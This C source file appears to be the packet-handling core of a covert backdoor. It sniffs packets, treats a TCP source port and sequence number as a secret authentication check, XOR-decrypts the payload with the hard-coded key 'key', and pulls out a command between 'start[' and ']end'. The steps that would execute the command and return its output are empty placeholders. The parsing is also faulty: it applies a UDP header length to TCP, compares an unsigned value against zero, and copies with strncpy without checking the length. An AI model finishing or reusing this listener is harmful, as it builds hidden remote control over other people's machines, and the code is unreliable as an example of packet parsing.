#include "packet_handler.h"
#include "crypto.h"
#include "packet_auth.h"

int get_source_port(const u_char* packet)
{
    const struct sniff_ip* ip;
    const struct sniff_tcp* tcp;

    int tcp_sport = 0;
    int size_ip = 0;
    int size_tcp = 0;

    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;

    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;

    tcp_sport = ntohs(tcp->th_sport);

    return tcp_sport;
}


/*
* Callback function for examining captured packets.
*
* Params:
*   u_char* args: Pointer to user data.
*   const struct pcap_pkthdr* header: Struct that contains information about the captured packet.
*   const u_char* packet: Pointer to the captured packet in serialized form.
*
* Returns:
*   None
*
*/
void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet)
{

    const char* COMMAND_START = "start[";
    const char* COMMAND_END = "]end";
    const char* KEY = "key";

    const int MAX_COMMAND_LEN = 1024;
    const int ETHER_IP_UDP_LEN = 44;

    char command[MAX_COMMAND_LEN];
    char decrypted[MAX_COMMAND_LEN];

    int len;
    int loop;
    int tcp_sport;
    u_int tcp_seqnum;
    
    char* payload;
    char* end_ptr;

    const struct sniff_ip* ip;
    const struct sniff_tcp* tcp;
    
    int size_ip = 0;
    int size_tcp = 0;

    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;

    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;

    tcp_sport = ntohs(tcp->th_sport);
    tcp_seqnum = ntohl(tcp->th_seq);
    
    // Step 1: Locate the payload of the packet
    payload = (char*)(packet + ETHER_IP_UDP_LEN);
    if ((header->caplen - ETHER_IP_UDP_LEN - 14) <= 0) // Why 14?
    {
        printf("error 1");
        return;
    }

    // Step 2: Authenticate the packet
    if (!is_seq_num_auth(tcp_sport, tcp_seqnum)) 
    {
        printf("packet not authenticated\n");
        printf("source port: %d\n", tcp_sport);
        printf("sequence_number: %d\n", tcp_seqnum);
        return;
    }

    printf("Got an authenticated packet\n Source port: %d\n Seqnum: %d\n", tcp_sport, tcp_seqnum);
    // Step 3: Decrypt the payload
    xor_decrypt(KEY, strlen(KEY), payload, MAX_COMMAND_LEN, decrypted);
    //printf("%s\n", decrypted);
    // Step 4: Verify decrypted payload has a command in it
    if (!(payload = strstr(decrypted, COMMAND_START)))
        return;
    payload += strlen(COMMAND_START);
    if (!(end_ptr = strstr(decrypted, COMMAND_END)))
        return;

    // Step 5: Extract the command
    memset(command, 0, sizeof(command));
    strncpy(command, payload, end_ptr - payload);

    // Step 6: Execute the command

    // Step 7: Send the command's output to the sender of the command

    return;
}
